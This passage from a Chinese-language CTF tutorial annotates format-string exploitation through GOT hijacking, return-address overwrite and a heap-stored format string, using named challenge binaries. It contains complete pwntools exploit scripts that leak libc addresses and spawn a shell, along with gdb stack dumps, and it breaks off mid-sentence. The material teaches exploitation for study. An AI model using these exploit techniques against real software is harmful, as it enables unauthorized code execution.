class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : filename.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat</span>(<span class="params">name,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;ftp&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;put&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;upload:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">name</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;ftp&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;get&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;get:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showlist</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;ftp&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;rxraclhm&quot;</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;puts_got:&quot;</span>+<span class="built_in">hex</span>(puts_got))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Rainism):&quot;</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">&quot;%8$s&quot;</span> + p32(puts_got)</span><br><span class="line">creat(<span class="string">&#x27;aaaa&#x27;</span>,payload)</span><br><span class="line">show(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line">libc_base = puts_leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.info(<span class="string">&quot;binsh:&quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line">onegadget = libc_base + <span class="number">0x3ac62</span></span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1:overcover puts@got 2 system@got</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = fmtstr_payload(7, &#123;puts_got: system&#125;)</span></span><br><span class="line"><span class="comment">#creat(&#x27;/bin/sh;&#x27;, payload)</span></span><br><span class="line"><span class="comment">#show(&#x27;/bin/sh;&#x27;)</span></span><br><span class="line"><span class="comment">#showlist()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2:overcover puts@got 2 onegadget</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;puts_got: onegadget&#125;)</span><br><span class="line">creat(<span class="string">&#x27;bbbb&#x27;</span>, payload)</span><br><span class="line">show(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>exp 替换我写得版本，这条题目的完整 WP ：<a href="example%5Cfmtstr_example%5Chijack_GOT%5C2016_CCTF_pwn3_writeup.md">2016_CCTF_pwn3_writeup</a></p></blockquote><p>注意</p><ul><li><p>我在获取 puts 函数地址时使用的偏移是 8，这是因为我希望我输出的前 4 个字节就是 puts 函数的地址。其实格式化字符串的首地址的偏移是 7。</p><p><strong>注解</strong>：结合 payload 来看：<code>payload = &quot;%8$s&quot; + p32(puts_got)</code> ，<code>%8$S</code>长度为 0x4 ，偏移为 7；<code>p32(puts_got)</code> 长度为 0x4 ，偏移为 8 ;</p></li><li><p>这里我利用了 pwntools 中的 fmtstr_payload 函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里 fmtstr_payload(7, {puts_got: system_addr}) 的意思就是，我的格式化字符串的偏移是 7，我希望在 puts_got 地址处写入 system_addr 地址。默认情况下是按照字节来写的。</p></li></ul><h2 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>很容易理解，我们要利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。</p><h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0">三个白帽 - pwnme_k0</a> 为例进行分析。</p><h4 id="确定保护-2"><a href="#确定保护-2" class="headerlink" title="确定保护"></a>确定保护</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  三个白帽-pwnme_k0 git:(master) ✗ checksec pwnme_k0</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>可以看出程序主要开启了 NX 保护以及 Full RELRO 保护。这我们就没有办法修改程序的 got 表了。</p><h4 id="分析程序-2"><a href="#分析程序-2" class="headerlink" title="分析程序"></a>分析程序</h4><p>简单分析一下，就知道程序似乎主要实现了一个类似账户注册之类的功能，主要有修改查看功能，然后发现在查看功能中发现了格式化字符串漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall sub_400B07@&lt;eax&gt;(<span class="keyword">char</span> format@&lt;dil&gt;, <span class="keyword">char</span> formata, __int64 a3, <span class="keyword">char</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Welc0me to sangebaimao!\n&quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;formata, <span class="string">&quot;Welc0me to sangebaimao!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;a4 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其输出的内容为 &amp;a4 + 4。我们回溯一下，发现我们读入的 password 内容也是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v6 = read(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;a4 + <span class="number">4</span>, <span class="number">0x14</span>uLL);</span><br></pre></td></tr></table></figure><p>当然我们还可以发现我们读入的 username 在距离的 password 20 个字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Input your username(max lenth:20): &quot;</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">v8 = read(<span class="number">0</span>, &amp;bufa, <span class="number">0x14</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v8 &amp;&amp; v8 &lt;= <span class="number">0x14</span>u )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input your password(max lenth:20): &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    v6 = read(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;a4 + <span class="number">4</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    *(_QWORD *)buf = bufa;</span><br><span class="line">    *(_QWORD *)(buf + <span class="number">8</span>) = a3;</span><br><span class="line">    *(_QWORD *)(buf + <span class="number">16</span>) = a4;</span><br></pre></td></tr></table></figure><p>好，这就差不多了。此外，也可以发现这个账号密码其实没啥配对不配对的。</p><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>我们最终的目的是希望可以获得系统的 shell，可以发现在给定的文件中，在 0x00000000004008A6 地址处有一个直接调用 system(‘bin/sh’) 的函数（关于这个的发现，一般都会现在程序大致看一下。）。那如果我们修改某个函数的返回地址为这个地址，那就相当于获得了 shell。</p><p>虽然存储返回地址的内存本身是动态变化的，但是其相对于 rbp 的地址并不会改变，所以我们可以使用相对地址来计算。</p><p><strong>注解</strong>：</p><p>上面这句话可以这样理解：有一个独立函数 A 的栈帧，这个 A 栈帧整体存放地址是动态变化的。但是 A 栈帧内部的结构是固定的，举个例子：rbp 一定在 rip 前面（低地址）。还有我们知道的是 rbp 存储的是上一个栈帧的 rbp 地址，如果说每次都是通过函数 B 调用函数 A ，因为AB 栈帧长度&amp;结构固定，我们就可以通过泄露函数 A rbp 的值减去偏移得到函数 A rip 地址。</p><p><img src="_images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/fmrstr_3.png" alt="fmrstr_3.png"></p><p>利用思路如下</p><ul><li>确定偏移</li><li>获取函数的 rbp 与返回地址</li><li>根据相对偏移获取存储返回地址的地址</li><li>将执行 system 函数调用的地址写入到存储返回地址的地址。</li></ul><h4 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h4><p>首先，我们先来确定一下偏移。输入用户名 aaaaaaaa，密码随便输入，断点下在输出密码的那个 printf(&amp;a4 + 4) 函数处</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Register Account first!</span><br><span class="line">Input your username(max lenth:20): </span><br><span class="line">aaaaaaaa</span><br><span class="line">Input your password(max lenth:20): </span><br><span class="line"><span class="meta">%</span><span class="bash">p%p%p%p%p%p%p%p%p%p</span></span><br><span class="line">Register Success!!</span><br><span class="line">1.Sh0w Account Infomation!</span><br><span class="line">2.Ed1t Account Inf0mation!</span><br><span class="line">3.QUit sangebaimao:(</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">error options</span></span><br><span class="line">1.Sh0w Account Infomation!</span><br><span class="line">2.Ed1t Account Inf0mation!</span><br><span class="line">3.QUit sangebaimao:(</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>此时栈的情况为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────</span><br><span class="line">     0x400b1a                  call   0x400758</span><br><span class="line">     0x400b1f                  lea    rdi, [rbp+0x10]</span><br><span class="line">     0x400b23                  mov    eax, 0x0</span><br><span class="line"> →   0x400b28                  call   0x400770</span><br><span class="line">   ↳    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0</span><br><span class="line">        0x400776                  xchg   ax, ax</span><br><span class="line">        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8</span><br><span class="line">        0x40077e                  xchg   ax, ax</span><br><span class="line">────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp</span><br><span class="line">0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30</span><br><span class="line">0x00007fffffffdb50│+0x10: &quot;aaaaaaaa&quot;     ← $rdi</span><br><span class="line">0x00007fffffffdb58│+0x18: 0x000000000000000a</span><br><span class="line">0x00007fffffffdb60│+0x20: 0x7025702500000000</span><br><span class="line">0x00007fffffffdb68│+0x28: &quot;%p%p%p%p%p%p%p%pM\r@&quot;</span><br><span class="line">0x00007fffffffdb70│+0x30: &quot;%p%p%p%pM\r@&quot;</span><br><span class="line">0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2</span><br></pre></td></tr></table></figure><p>可以发现我们输入的用户名在栈上第三个位置，那么除去本身格式化字符串的位置，其偏移为为 5 + 3 = 8。</p><p><strong>注解</strong>：</p><p>这里我还是用我习惯的方法，输出几个 %p 直接数出来偏移。</p><h4 id="修改地址"><a href="#修改地址" class="headerlink" title="修改地址"></a>修改地址</h4><p>我们再仔细观察下断点（b printf）处栈的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp</span><br><span class="line">0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30</span><br><span class="line">0x00007fffffffdb50│+0x10: &quot;aaaaaaaa&quot;     ← $rdi</span><br><span class="line">0x00007fffffffdb58│+0x18: 0x000000000000000a</span><br><span class="line">0x00007fffffffdb60│+0x20: 0x7025702500000000</span><br><span class="line">0x00007fffffffdb68│+0x28: &quot;%p%p%p%p%p%p%p%pM\r@&quot;</span><br><span class="line">0x00007fffffffdb70│+0x30: &quot;%p%p%p%pM\r@&quot;</span><br><span class="line">0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2</span><br></pre></td></tr></table></figure><p>可以看到栈上第二个位置存储的就是该函数的返回地址 (其实也就是调用 show account 函数时执行 push rip 所存储的值)，在格式化字符串中的偏移为 7。</p><p>与此同时栈上，第一个元素存储的也就是上一个函数的 rbp。所以我们可以得到偏移 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38。继而如果我们知道了 rbp 的数值，就知道了函数返回地址的地址。</p><p><img src="_images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/fmrstr_3.png" alt="fmrstr_3.png"></p><p>0x0000000000400d74 与 0x00000000004008A6 只有低 2 字节不同，所以我们可以只修改 0x00007fffffffdb48 开始的 2 个字节。</p><p>这里需要说明的是<strong>在某些较新的系统 (如 ubuntu 18.04) 上, 直接修改返回地址为 0x00000000004008A6 时可能会发生程序 crash</strong>, 这时可以考虑修改返回地址为 0x00000000004008AA, 即直接调用 system(“/bin/sh”) 处</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004008A6 sub_4008A6      proc near</span><br><span class="line">.text:00000000004008A6 ; __unwind &#123;</span><br><span class="line">.text:00000000004008A6                 push    rbp</span><br><span class="line">.text:00000000004008A7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004008AA &lt;- here         mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004008AF                 call    system</span><br><span class="line">.text:00000000004008B4                 pop     rdi</span><br><span class="line">.text:00000000004008B5                 pop     rsi</span><br><span class="line">.text:00000000004008B6                 pop     rdx</span><br><span class="line">.text:00000000004008B7                 retn</span><br></pre></td></tr></table></figure><h4 id="利用程序-1"><a href="#利用程序-1" class="headerlink" title="利用程序"></a>利用程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : pwnme_k0.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwnme_k0&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwnme_k0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack addr</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + <span class="string">&quot;%6$p&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;20): \n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;20): \n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b printf&#x27;)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x38</span></span><br><span class="line">log.info(<span class="string">&quot;stack_leak:&quot;</span>+<span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack retaddr</span></span><br><span class="line">payload1 = p64(stack_leak)</span><br><span class="line">payload2 = <span class="string">&quot;%2218d%8$hn&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;20): \n&quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;20): \n&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>注解</strong>：</p><ol><li>泄露地址的时候使用格式化字符串用的是 %p ，如果用 %s 再 u64 泄露出来的是函数 B 的 rbp 的值。原因也很简单，要求输出的是字符，系统到函数 A rbp 的值指向的地址取值，也就是函数 B 的值。如果是 %p 就将函数 A rbp 的值输出。</li><li>hijack 部分的 payload ，格式化字符串可以放到 name 输入，也就是和 stack_leak 一起输入，password 就随便输入点东西行了。这里因为输入长度现在，所以没有使用最稳妥的 单字节 输入，而是双字节。</li></ol><h2 id="堆上的格式化字符串漏洞"><a href="#堆上的格式化字符串漏洞" class="headerlink" title="堆上的格式化字符串漏洞"></a>堆上的格式化字符串漏洞</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>所谓堆上的格式化字符串指的是格式化字符串本身存储在堆上，这个主要增加了我们获取对应偏移的难度，而一般来说，该格式化字符串都是很有可能被复制到栈上的。（出现情况就像下面例子，格式化字符串本身存储在堆上，字符指针指向栈上，出现的情况是我们不能容易控制写入的地址）</p><h3 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 2015 年 CSAW 中的 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts">contacts</a> 为例进行介绍。</p><h4 id="确定保护-3"><a href="#确定保护-3" class="headerlink" title="确定保护"></a>确定保护</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  2015-CSAW-contacts git:(master) ✗ checksec contacts</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看出程序不仅开启了 NX 保护还开启了 Canary。（RELRO 半保护，我们是不是能 hijack got 表呢？hijack retaddr 呢？）</p><h4 id="分析程序-3"><a href="#分析程序-3" class="headerlink" title="分析程序"></a>分析程序</h4><p>简单看看程序，发现程序正如名字所描述的，是一个联系人相关的程序，可以实现创建，修改，删除，打印联系人的信息。而再仔细阅读，可以发现在打印联系人信息的时候存在格式化字符串漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">PrintInfo</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">char</span> *format)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\tName: %s\n&quot;</span>, a1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\tLength %u\n&quot;</span>, a2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\tPhone #: %s\n&quot;</span>, a3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\tDescription: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(format);<span class="comment">//格式化字符串漏洞</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细看看，可以发现这个 format 其实是指向堆中的。</p><p><strong>注解</strong>：可以从调用 PrintInfo 的上层函数查看最后一个参数：（v2 是结构体链表）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_8048BD1(v2 + <span class="number">8</span>, *(_DWORD *)(v2 + <span class="number">72</span>), *(_DWORD *)(v2 + <span class="number">4</span>), *(<span class="keyword">char</span> **)v2);</span><br></pre></td></tr></table></figure><h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><p>我们的基本目的是获取系统的 shell，从而拿到 flag。其实既然有格式化字符串漏洞，我们应该是可以通过劫持 got 表或者控制程序返回地址来控制程序流程。但是这里却不怎么可行。原因分别如下</p><ul><li><p>之所以不能够劫持 got 来控制程序流程，是因为我们发现对于程序中常见的可以对于我们给定的字符串输出的只有 printf 函数，我们只有选择它才可以构造 /bin/sh 让它执行 system(‘/bin/sh’)，但是 printf 函数在其他地方也均有用到，这样做会使得程序直接崩溃。</p><p><strong>注解</strong></p><p>换句人话就是：在这个程序中，我们能控制输入参数的函数就只有 printf ，诸如 puts 等的参数都是我们不可控的。因为修改 got 表之后我们需要传入 binsh 的地址，所以只能选择 printf 。但是选择 printf 又有一个问题，我们修改完后，printf 各个地方都会用到，还没运行到我们能输入参数的地方，程序就已经挂逼了。</p><p>这里还有一个原因 wiki 中没有提及，那就是我们不能直接控制写入地址。原因很简单：通过分析程序知道，格式化字符串是存放在堆上，而字符串指针是在栈上，很明显的现象就是栈上不是字符串的明文，而是字符串的堆地址，就算我们在格式化字符串中输入目标地址，也不能通过偏移获取。（这个程序全部可控输入都放在堆上）我们不能直接控制输入目标地址，找栈上现有的地址。</p><p>超长偏移能取到值？我们当它是可行的试一试，格式化字符串到描述堆块相差 <code>-0xf7fafed0</code> ，偏移为 <code>-1040105396</code> ，构造尝试一下：</p><p><img src="_images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/fmrstr_4.png" alt="fmrstr_4.png"></p></li><li><p>其次，不能够直接控制程序返回地址来控制程序流程的是因为我们并没有一块可以直接执行的地址来存储我们的内容，同时利用格式化字符串来往栈上直接写入 system_addr + ‘bbbb’ + addr of ‘/bin/sh‘ 似乎并不现实。</p><p><strong>注解</strong>：</p><p>换句人话就是：我们不能直接控制目标地址，只能在栈上通过偏移找地址，而栈上没有指向 eip 的地方，也就找不到 eip 地址，就不能修改 eip 的值。</p></li></ul><p><strong>注解</strong>：</p><p>就因为我们不能直接控制目标地址，所以不能用 hijack GOT 、hijack retaddr 。</p><p>那么我们可以怎么做呢？我们还有之前在栈溢出讲的技巧，stack pivoting。而这里，我们可以控制的恰好是堆内存，所以我们可以把栈迁移到堆上去。这里我们通过 leave 指令来进行栈迁移，所以在迁移之前我们需要修改程序保存 ebp 的值为我们想要的值。 只有这样在执行 leave 指令的时候， esp 才会成为我们想要的值。（leave 指令等于：<code>mov esp,ebp;pop 